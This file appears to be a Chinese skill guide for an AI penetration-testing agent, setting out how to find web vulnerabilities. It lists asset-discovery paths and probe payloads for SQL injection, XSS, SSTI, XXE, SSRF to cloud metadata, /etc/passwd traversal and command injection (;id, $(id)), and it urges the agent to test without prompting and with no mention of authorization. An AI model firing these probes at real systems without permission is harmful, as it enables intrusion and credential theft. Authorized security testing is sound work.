---
name: vuln-discovery-methodology
description: >
  漏洞发现系统方法论 — 从请求参数收割到漏洞信号确认的完整流程。
  解决「知道怎么打，不知道怎么找」的核心短板。
  每次渗透测试必须在利用漏洞前先执行本方法论。
---

# 漏洞发现系统方法论

> **核心问题**：现有技能几乎全部是「已知漏洞点后的利用技术」，缺乏从零发现漏洞点的系统方法。
> **解决目标**：不再依赖用户提示「这里可能有漏洞」，能独立从请求中识别漏洞信号。

---

## 0. 完整流程图

```
Phase 0: 路径/资产发现（这个站点到底有什么？）
  ├── 被动提取 (HTML/JS/注释/source map/robots.txt)
  ├── 主动扫描 (curl标配 + dirsearch 字典)
  ├── 响应分析 → 指纹识别 → 框架已知路径补测
  ├── 递归扩展 (SOAP→WSDL / DWR→接口 / Swagger→API)
  ├── 源码泄露探测 (.git/.svn/备份/IDE/日志)
  └── 汇总去重 → P0/P1/P2 价值排序
       ↓
Phase ①: 指纹 + N-day 判断（2分钟）
  ├── 有明确产品指纹 → 查本地 POC 库 → 打 N-day
  └── 无 N-day 可打 → 进入功能测试
       ↓
Phase ②: 功能点遍历 + 请求收割
  └── 浏览器操作每个功能点 → Burp 抓所有请求
       ↓
Phase ③: 参数全量枚举 + 语义分析 → 漏洞类型映射
       ↓
Phase ④: 首轮快速探测 (P0→P1→P2→P3)
       ↓
Phase ⑤: 响应差异分析 → 信号分级
       ↓
Phase ⑥: 强信号深挖确认 → 工具接管利用
```

---

## 0.1 核心原则

```
漏洞发现 = 路径资产发现 × 参数全量枚举 × 语义分析 × 系统探测 × 响应差异识别
漏洞利用 = 已知注入点 × 手工定性 × WAF绕过 × 工具接管
```

**本方法论解决的是「发现」环节（Phase 0-⑤），利用环节（Phase ⑥）是已有的强项。**

---

## Phase 0: 路径/资产发现 (PATH & ASSET DISCOVERY)

> **这是整个方法论的第一阶段，不允许跳过。不知道站点有什么路径就直接测功能点是盲打。**

完整方法论参考: [[kb_path_discovery_methology]] + [[kb_high_value_path_priority]]

### 0.1 为什么路径发现必须第一

```
不知道有哪些接口 → 不知道有什么功能 → 不知道攻击面有多大
跳过路径发现 = 瞎子摸象 = 漏掉 80% 的攻击面
```

### 0.2 五层路径发现（控制在 5 分钟内）

#### 第1层：被动提取（零额外请求，<30秒）

从已有页面提取路径，不产生额外请求：

```
□ curl -sk 首页 → 提取 src/href/action/url/path 属性
□ 提取 HTML 注释 (<!-- -->) → 常含调试路径
□ 提取 JS 注释 (//TODO //FIXME //DEBUG) → 常含内部路径
□ 提取 <script src="..."> → 逐一下载 JS → 提取 api/url/path/endpoint/baseUrl
□ 提取 source map (sourceMappingURL=...) → 还原原始文件路径
□ robots.txt → 网站主动暴露的路径
□ sitemap.xml → 全站 URL 地图
```

#### 第2层：主动扫描（curl + dirsearch，<3分钟）

```
□ curl 扫 40 个标配路径（30秒）:
   WebService: /services/ /services/wsdl /axis2/services/ /ws/ /soap/
   框架标配: /dwr/ /api/ /swagger-ui.html /v2/api-docs /druid/ /actuator/
   信息泄露: /WEB-INF/web.xml /.env /.git/config /.svn/entries
   管理后台: /admin/ /manager/ /console/ /host-manager/

□ dirsearch 字典扫描（2分钟）:
   python <workdir>/tools/dirsearch-0.4.3/dirsearch.py \
     -u TARGET -e jsp,do,action,html,wsdl,xml,json,asp,aspx,php \
     --random-agent -t 15 -x 404,500
```

#### 第3层：响应分析 + 指纹识别

每次 curl 返回必须分析，不只是看状态码：

```
□ 区分真假 404: 所有路径返回相同字节数 = 统一自定义404
□ 302 → 追踪重定向目标
□ 401/403 → 存在但需认证 → 标记为 P1
□ 200 且 size 异常 → 真实页面 → 提取内容做指纹
□ 500/502 → 可能存在但出错 → 换方法/POST 重试

指纹线索:
□ Server/X-Powered-By/Cookie 响应头
□ HTML title/meta generator
□ 页面内 JS 库名/版本
□ 404 页面的特征文案
```

#### 第4层：框架已知路径补测

识别框架后按框架路径表追加测试（不是替代通用扫描）：

| 框架指纹 | 追加路径 |
|----------|----------|
| Axis/DWR | /dwr/interface/*.js, /services/*?wsdl |
| Spring Boot | /actuator/heapdump, /actuator/env, /actuator/mappings |
| 正方教务 | /portal.do, /ewebeditor/, /WEB-INF/properties/ |
| Tomcat | /manager/html, /host-manager/html |
| Druid | /druid/sql.html, /druid/websession.html |
| Swagger | /swagger-resources, /v3/api-docs |
| 通用 Java | /WEB-INF/web.xml, /META-INF/MANIFEST.MF |
| 通用 PHP | /phpinfo.php, /.env, /composer.json |

#### 第5层：递归扩展

```
□ 命中 /services/ → WSDL 递归 → 提取所有方法
□ 命中 /dwr/index.html → 读取所有 /dwr/interface/*.js
□ 命中 /swagger-ui.html → 读取 /v2/api-docs → 全量 API
□ 命中 /business/ 目录 → 再用字典扫 /business/*
□ 命中 /admin/ 目录 → 优先扫 /admin/*
```

#### 第6层：源码泄露探测

```
□ 备份文件: .bak .backup .old .orig .swp ~ .save .tmp
□ 版本控制: /.git/HEAD /.svn/entries /.hg/requires
□ 压缩包: backup.zip wwwroot.rar web.zip site.tar.gz
□ IDE配置: /.idea/ /.vscode/ /.project /.classpath
□ 日志文件: /access.log /error.log /catalina.out
□ 环境文件: /.env /.env.production /config.json
```

### 0.3 汇总 → 价值排序

```
所有路径汇总去重 → 按价值排序:

P0 (命中即洞):
  /services/*?wsdl → SOAP RCE
  /druid/index.html → 数据库监控
  /actuator/heapdump → 内存凭证
  /swagger-ui.html → 全量 API 暴露
  /dwr/index.html → Java 方法直接调用
  /upload/ /ewebeditor/ → 文件上传
  /download.do?id= /file.do?path= → 任意文件读取
  /WEB-INF/web.xml → 完整路由映射

P1 (大概率有洞):
  登录口 / 密码重置 / API端点 / 搜索列表接口 / 导入导出

P2 (需特定条件):
  管理后台 / JBoss JMX / .git泄露 / 调试信息
```

### 0.4 Phase 0 自检

```
□ 五层路径发现全部执行了吗？
□ 指纹识别出框架了吗？
□ 框架已知路径补测了吗？
□ 命中目录递归了吗？
□ 所有路径汇总去重 → P0/P1/P2 排序了吗？
□ Phase 0 总耗时 < 5 分钟？

只有全部完成，才能进入 Phase ①。
```

---

## Phase 1: 请求全量收割 (Request Harvesting)

### 1.1 每个功能点必须抓取的请求

在 Burp 中操作一个功能点时，必须捕获以下所有请求：

```
□ 页面加载请求 (GET)
□ 列表/搜索请求 (带参数的 GET/POST)
□ 筛选/排序请求 (sort, order, filter, page 参数)
□ 表单提交请求 (POST)
□ 文件上传请求 (multipart)
□ 导出请求 (export, download)
□ AJAX/API 调用 (XHR, Fetch)
□ WebSocket 消息
□ 图片/附件加载请求 (可能带 id 参数)
```

### 1.2 收割检查清单

在开始测任何漏洞前：
```
□ 这个功能点的所有请求都在 Burp History 里了吗？
□ 搜索/筛选/排序/分页/导出/导入 都触发过了吗？
□ 不同角色看到的请求都抓了吗？
□ 移动端/小程序 API 请求抓了吗？
```

---

## Phase 2: 参数全量枚举 (Parameter Enumeration)

### 2.1 强制规则

**一个请求的所有参数都必须枚举，不得跳过任何参数。**

参数来源：
```
□ URL 查询参数 (?a=1&b=2&c=3)
□ POST Body 参数 (x-www-form-urlencoded)
□ JSON Body 字段 (application/json)
□ multipart 字段 (form-data)
□ HTTP Headers (Cookie, User-Agent, Referer, X-Forwarded-For, Authorization...)
□ Path 参数 (/api/user/123 → 123 是参数)
□ WebSocket 消息字段
□ GraphQL variables
```

### 2.2 参数清单模板

对每个请求，列出所有参数：

```
请求: POST /api/items/search
参数清单:
  URL: page, size
  Body: keyword, categoryId, status, sortField, sortOrder, startDate, endDate
  Header: Authorization, Cookie, X-Requested-With
  JSON: {keyword, categoryId, status, sortField, sortOrder, dateRange: {start, end}}
```

---

## Phase 3: 参数语义分析 → 漏洞类型映射 (THE KEY BRIDGE)

这是整个方法论中最关键的一步。**每个参数名/值都暗示了它在后端的处理方式，从而指向最可能存在的漏洞类型。**

### 3.1 参数语义 → 后端操作 → 漏洞类型

| 参数语义 | 参数名特征 | 后端大概率做的事 | 优先测 |
|----------|----------|----------------|-------|
| **排序字段** | sort, order, sortField, sortName, sortBy, orderBy, sortOrder, sortDirection, order[0][column], order[0][dir], dir, direction, column | 拼接到 ORDER BY 子句 | **SQL 注入 (ORDER BY)** |
| **分页** | page, pageSize, pageNum, limit, offset, start, count, rows, per_page | LIMIT/OFFSET 或 ROWNUM | **SQL 注入** |
| **搜索关键词** | keyword, search, query, q, key, k, wd, text, content, filterValue | WHERE LIKE 或全文搜索 | **SQL 注入, XSS** |
| **ID类参数** | id, uid, userId, itemId, orderId, pid, cid, did, rid, docId, fileId | WHERE id = ? | **SQL 注入, 越权(IDOR)** |
| **分类/状态** | category, type, status, kind, class, group, level, role | WHERE type = ? | **SQL 注入** |
| **文件名/路径** | file, filename, path, filepath, url, src, dir, folder, resource, template, include | 文件系统操作 | **路径穿越, LFI, 命令注入** |
| **URL/链接** | url, link, href, callback, redirect, redirect_uri, return, next, target, ref, webhook, endpoint, imageUrl, avatar | HTTP请求/重定向 | **SSRF, 开放重定向** |
| **日期/时间** | date, time, startDate, endDate, from, to, begin, end, datetime, timestamp, created, updated | SQL日期函数 | **SQL 注入** |
| **邮箱/手机** | email, phone, mobile, mail, contact, receiver, to, cc | 邮件/短信发送 | **SMTP注入, SSRF** |
| **XML内容** | xml, soap, data (当Content-Type为xml时) | XML解析 | **XXE** |
| **模板/HTML** | template, tpl, html, content (WYSIWYG), body, message, description, bio | 模板渲染/HTML输出 | **SSTI, XSS** |
| **文件名(上传)** | file, upload, attachment, avatar, image, photo, doc, import | 文件存储/处理 | **文件上传, 命令注入(处理链)** |
| **用户名/密码** | username, user, login, password, passwd, pwd, pin, token, auth | 认证查询 | **SQL 注入, LDAP注入** |
| **JSON/序列化** | json, data, payload, body, request, input | 反序列化 | **反序列化** |
| **CSV/导入** | import, csv, excel, batch, bulk | 解析导入 | **CSV注入, XXE(XLSX)** |
| **金额/数量** | price, amount, quantity, qty, count, total, fee, balance, cost, points, credit | 业务计算 | **业务逻辑** |
| **优惠券/折扣** | coupon, promo, discount, code, referral, invite, gift | 业务规则 | **业务逻辑, 竞态条件** |

### 3.2 参数值语义分析

不仅看参数名，还要看参数值：

| 参数值特征 | 暗示 | 优先测 |
|----------|------|-------|
| 数字型值 (123, 456) | 可能是 ID / 数值比较 | SQLi (数字型), IDOR |
| 字符串型值 ("hello") | 字符串比较/LIKE | SQLi (字符串型), XSS |
| UUID/GUID | 资源标识符 | IDOR |
| Base64 值 | 编码数据 → 解码后可能含注入 | 先解码再看 |
| JSON 字符串 | 嵌套数据 | 二次注入 |
| 文件路径 (/a/b/c) | 文件系统操作 | LFI, Path Traversal |
| URL (http://...) | HTTP 请求 | SSRF |
| HTML片段 | 可能渲染 | XSS, SSTI |
| 空值/null | 可尝试注入新语义 | 各种注入 |

### 3.3 JSON/XML/GraphQL 参数遍历

```
JSON Body 中的每个 key 都是参数，必须逐个检测：
{
  "keyword": "...",     ← 参数1
  "filter": {           ← 参数2 (嵌套)
    "status": "...",    ← 参数3
    "dateRange": {      ← 参数4
      "start": "...",   ← 参数5
      "end": "..."      ← 参数6
    }
  },
  "sort": {             ← 参数7
    "field": "...",     ← 参数8
    "direction": "..."  ← 参数9
  }
}
→ 共 9 个参数需要逐一检测
```

---

## Phase 4: 首轮快速探测 (First-Pass Probing)

### 4.1 探测原则

```
1. 按 3.1 的映射表，每个参数测其映射到的漏洞类型
2. 每种漏洞类型用 3-5 个最小探测 payload
3. 重点看响应差异（不是报错）
4. 无差异 ≠ 无漏洞，只是首轮未命中
```

### 4.2 各漏洞类型首轮探测 Payload

#### SQL 注入 (数字型参数)
```
原值: 123
测试: 123'           → 报错/异常 → 强信号
测试: 123 and 1=1   → 与原响应相同 → 中等信号
测试: 123 and 1=2   → 与原响应不同 → 强信号(布尔差异)
测试: 123-0          → 等于原响应 → 算术运算被执行
测试: 2-1            → 等于 1 的响应 → 算术运算被执行
```

#### SQL 注入 (字符串型参数)
```
原值: hello
测试: hello'         → 报错 → 强信号
测试: hello' and '1'='1  → 与原响应相同 → 中等信号
测试: hello' and '1'='2  → 与原响应不同 → 强信号
测试: hello'--       → 与原响应相同 → 中等信号
测试: hello%27       → URL编码 → 绕过简单过滤
```

#### SQL 注入 (排序参数 — 特殊处理)
```
原值: createTime
测试: createTime desc   → 响应顺序变化 → 直接用原参数测
测试: 1                 → 不报错 → 数字可接受
测试: (select 1)        → 不报错 → 子查询可接受
测试: 1 asc,2 desc      → 响应变化 → 确认注入
测试: DECODE(1,1,id,name) → 切换排序列 → 布尔盲注
```

#### XSS
```
原值: hello
测试: <h2>test</h2>     → HTML标签原样返回 → XSS可能
测试: <svg onload=alert(1)>  → 执行 → 确认XSS
测试: "><svg onload=alert(1)>  → 属性闭合
测试: '-alert(1)-'     → JS字符串闭合
测试: </textarea><svg onload=alert(1)>  → 标签闭合
```

#### SSRF
```
原值: https://example.com/callback
测试: http://127.0.0.1/                     → 访问本地
测试: http://burp-collaborator/             → 外带确认
测试: http://169.254.169.254/latest/meta-data/  → 云元数据
测试: file:///etc/passwd                    → 本地文件
测试: http://[::1]/                         → IPv6绕过
```

#### 路径穿越/LFI
```
原值: report.pdf
测试: ../../etc/passwd          → Linux穿越
测试: ..\..\windows\win.ini     → Windows穿越
测试: ....//....//etc/passwd    → 过滤绕过
测试: /etc/passwd               → 绝对路径
测试: file:///etc/passwd        → 协议注入
```

#### 命令注入
```
原值: 127.0.0.1
测试: 127.0.0.1;id             → 分号注入
测试: 127.0.0.1&&id            → AND注入
测试: 127.0.0.1|id             → 管道注入
测试: 127.0.0.1$(id)           → 命令替换
测试: 127.0.0.1%0aid           → 换行注入
```

#### XXE
```
（仅在 Content-Type 为 XML 或参数包含 XML 时测试）
测试: <!DOCTYPE foo [<!ENTITY xxe "test">]><root>&xxe;</root>
测试: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://collaborator/">]><root>&xxe;</root>
```

#### SSTI
```
原值: Hello {{name}}
测试: {{7*7}}       → 返回 49 → Jinja2/Twig
测试: ${7*7}        → 返回 49 → FreeMarker/Velocity
测试: {{config}}    → Flask 配置泄露
测试: ${{<%[%'"}}%  → polyglot 探针
```

#### 越权/IDOR
```
不改变请求内容，只改变身份上下文：
测试: 用户A的ID → 替换为用户B的ID
测试: 移除 Authorization Header → 是否还能访问
测试: 普通用户Token → 访问管理员接口
```

### 4.3 首轮探测执行规则

```
□ 每个参数至少测 3-5 个 payload
□ 不要因为「参数名看起来无关」就跳过
□ 不要因为「第一个 payload 没反应」就停止
□ 响应差异分析比报错分析更重要
□ JSON 参数和 Header 参数不能跳过
```

---

## Phase 5: 响应差异分析 (Response Differential Analysis)

### 5.1 六种差异信号

| 信号类型 | 表现 | 最可能对应 |
|---------|------|----------|
| **报错差异** | 500 vs 200 | SQLi, 命令注入, LFI |
| **内容差异** | 响应内容不同 | SQLi(布尔), XSS, SSTI |
| **长度差异** | Content-Length 明显不同 | SQLi(布尔), XXE |
| **时间差异** | 响应时间明显不同 (>2s) | SQLi(盲注), SSRF(盲) |
| **状态码差异** | 200 vs 302 vs 403 | 越权, 认证绕过 |
| **结构差异** | JSON key 增加/减少 | SSTI, 反序列化 |

### 5.2 系统对比流程

```
1. 发送正常请求 → 记录基线响应
2. 发送探测请求 → 对比与基线的差异
3. 差异存在 → 记录信号类型 + 参数名 + payload
4. 差异不存在 → 换下一类 payload / 漏洞类型
5. 一个参数出现信号 → 不要立即深挖，先完成全参数首轮探测
```

### 5.3 Burp Comparer 快速对比

```
对关键请求:
1. 右键 → Send to Comparer
2. 修改参数发送探测请求
3. 右键 → Send to Comparer
4. Comparer → 对比两个响应
→ 快速识别布尔/内容差异
```

---

## Phase 6: 从信号到确认 (Signal → Confirmation)

### 6.1 信号等级

| 等级 | 定义 | 行动 |
|-----|------|------|
| **强信号** | 报错 / 响应内容明显不同 / 时间明显延迟 | 立即深挖确认 |
| **中等信号** | 响应长度不同 / JSON结构变化 | 增加变体测试 |
| **弱信号** | 仅状态码不同 / 仅 header 不同 | 记录但不优先 |
| **无信号** | 毫无差异 | 换漏洞类型继续 |

### 6.2 强信号 → 深挖流程

```
强信号出现
├── 有报错信息 → 从报错判断 DBMS/语言/框架
│                → 针对性构造高级 payload
│                → 手工确认真实可利用
│                → 调用工具 (sqlmap/...) 完成利用
│
├── 有布尔差异 → 确认差异稳定性
│              → 构造更精确的布尔条件
│              → 确定注入类型 (数字/字符串/ORDER BY)
│              → 手工提取少量数据验证
│              → 调用工具批量 dump
│
├── 有时间差异 → 排除网络抖动
│              → 多次重复确认时间差
│              → 构造条件时间盲注
│              → 字符集确定 → 逐位提取
│
└── 有外带请求 → 检查 Collaborator
               → 确认请求来源IP
               → 尝试升级到数据外带
```

### 6.3 无信号处理

```
一个参数全部 payload 无信号:
□ 确认没有漏测的参数（JSON嵌套、Header、Cookie）
□ 确认没有使用错误的 Content-Type
□ 确认没有漏测的漏洞类型（如反序列化、LDAP注入）
□ 换编码方式重试（URL编码、Unicode、大小写）
□ 记录为「首轮阴性」→ 移到下一个参数
□ 不在单个参数上死磕超过 10 种方法
```

---

## Phase 7: 功能点全遍历 (Feature Coverage)

### 7.1 每个页面的测试清单

```
□ 搜索框 → 输入关键词 → 抓请求 → 测 SQLi + XSS
□ 排序 (点列头) → 抓请求 → 测 ORDER BY SQLi
□ 筛选 (下拉框/日期选择) → 抓请求 → 测 SQLi
□ 分页 (点下一页/改变每页条数) → 抓请求 → 测 SQLi
□ 表单提交 (新增/修改) → 抓请求 → 测所有注入类型
□ 文件上传 → 抓请求 → 测上传绕过 + 处理链
□ 导出 → 抓请求 → 测 SQLi + SSRF
□ 导入 → 抓请求 → 测 XXE + CSV注入
□ 删除 → 抓请求 → 测 IDOR
□ 查看详情 → 抓请求 → 测 IDOR + SQLi
```

### 7.2 不要跳过的功能点

```
高频遗漏点：
- 注册页面 → SQLi, 用户名枚举
- 忘记密码 → SQLi, 用户名枚举, 令牌预测
- 修改资料 → XSS(用户名/签名等), 文件上传(头像)
- 站内信 → XSS, SQLi
- 消息通知 → XSS
- 评论/留言 → XSS, SQLi
- 反馈/联系我们 → Blind XSS
- 日志查看 → SQLi
- 报表/统计 → SQLi
- 批量操作 → SQLi, 命令注入
```

---

## Phase 8: 执行优先级

### 8.1 漏洞发现优先级 (P0 → P3)

```
P0 (最高优先级，每个功能点必须先测):
  □ SQL 注入 (所有参数，尤其是排序/搜索/分页/ID/筛选)
  □ 命令注入 (文件操作/导入导出/处理链参数)
  □ 文件上传 Getshell

P1 (高优先级，SQL注入阴性后立即测):
  □ SSRF (URL/回调/导入/Webhook参数)
  □ 越权/IDOR (所有ID类参数)
  □ XXE (XML接口/Office导入/SVG上传)
  □ SSTI (模板渲染/邮件模板)

P2 (中优先级):
  □ XSS (所有反射点 + 存储点)
  □ 反序列化 (Base64参数/序列化接口)
  □ LFI/路径穿越 (文件路径参数)

P3 (补充测试):
  □ CSRF
  □ 开放重定向
  □ CRLF注入
  □ LDAP注入 (有统一认证时升级为P1)
  □ 其他注入类型
```

### 8.2 每个功能点的测试顺序

```
Step 1: 功能操作 → Burp抓包 → 列出所有请求
Step 2: 对每个请求 → 枚举所有参数 → 做语义分析
Step 3: 对每个参数 → 按映射表确定优先漏洞类型
Step 4: P0 漏洞类型 → 首轮3-5个payload → 分析响应差异
Step 5: 有信号 → 深挖确认 / 无信号 → P1 漏洞类型 → 重复Step 4
Step 6: P1 完 → P2 → P3
Step 7: 全部完成 → 下一个功能点
```

---

## Phase 9: 禁止行为

```
✗ 只测了 URL 参数，没测 POST body 参数，就判断「这里没有 SQL 注入」
✗ 只测了最明显的 2-3 个参数就下结论
✗ 没有做参数语义分析，机械地往所有参数灌相同 payload
✗ 只在一种 Content-Type 下测，没切换 multipart/JSON
✗ 看到没有报错回显就放弃（盲注探测没做）
✗ 在单个参数上死磕超过 10 种 payload 而不换思路
✗ 没遍历完页面的所有功能点就开始深挖一个可疑点
✗ 不抓 Burp 请求直接 curl 测（会丢失认证上下文）
✗ 不做响应对比，只用肉眼判断
✗ 等用户提示「这里可能有漏洞」才开始测
```

---

## Phase 10: 与 Burp 的集成

### 10.1 Burp 在发现阶段的核心用法

```
1. Proxy → 拦截并浏览所有功能点 → 积累 History
2. Repeater → 对每个请求的参数逐一修改测试
3. Comparer → 对比正常 vs 探测响应
4. Intruder → 批量参数 + 批量payload组合测试
5. Logger → 记录所有测试请求和响应
6. Collaborator → 外带确认 SSRF/XXE/Blind SQLi
```

### 10.2 Intruder 快速参数扫描

```
配置:
  Attack type: Sniper
  Position: 每次替换一个参数的值
  Payload: 通用注入探测列表
    '
    ' or 1=1--
    1 or 1=1
    ; sleep 5--
    $(id)
    ../../etc/passwd
    {{7*7}}
    <svg onload=alert(1)>

分析:
  排序结果 by 响应长度 / 响应时间
  → 异常值 = 需要手工深挖的信号
```

---

## Phase 11: 自检清单 (每次测试前)

```
□ 当前页面的所有功能点都点过了吗？
□ 每个功能点的所有请求都在 Burp History 里了吗？
□ 每个请求的所有参数 (URL/Body/Header/Cookie/JSON) 都列出来了吗？
□ 每个参数都做了语义分析 → 映射到对应的漏洞类型了吗？
□ P0 漏洞类型 (SQL注入/命令注入/文件上传) 每个参数都测了吗？
□ 响应差异分析做了吗？(不只是看报错)
□ JSON 嵌套参数遍历了吗？
□ 不同的 Content-Type (JSON/multipart/xml) 都试了吗？
```

只有以上全部通过，才能说「这个功能点已覆盖」。
